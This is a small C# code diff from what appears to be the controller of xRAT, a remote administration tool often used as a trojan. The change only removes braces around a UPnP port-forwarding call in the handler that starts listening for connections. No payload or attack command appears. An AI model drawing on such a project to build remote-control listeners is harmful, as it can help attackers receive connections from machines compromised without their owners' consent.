@@ -36,9 +36,7 @@ namespace xRAT_2.Forms
             if (btnListen.Text == "Start listening" && !listenServer.Listening)
             {
                 if (chkUseUpnp.Checked)
-                {
                     Core.UPnP.ForwardPort(ushort.Parse(ncPort.Value.ToString()));
-                }
 
                 listenServer.Listen(ushort.Parse(ncPort.Value.ToString()));
                 btnListen.Text = "Stop listening";
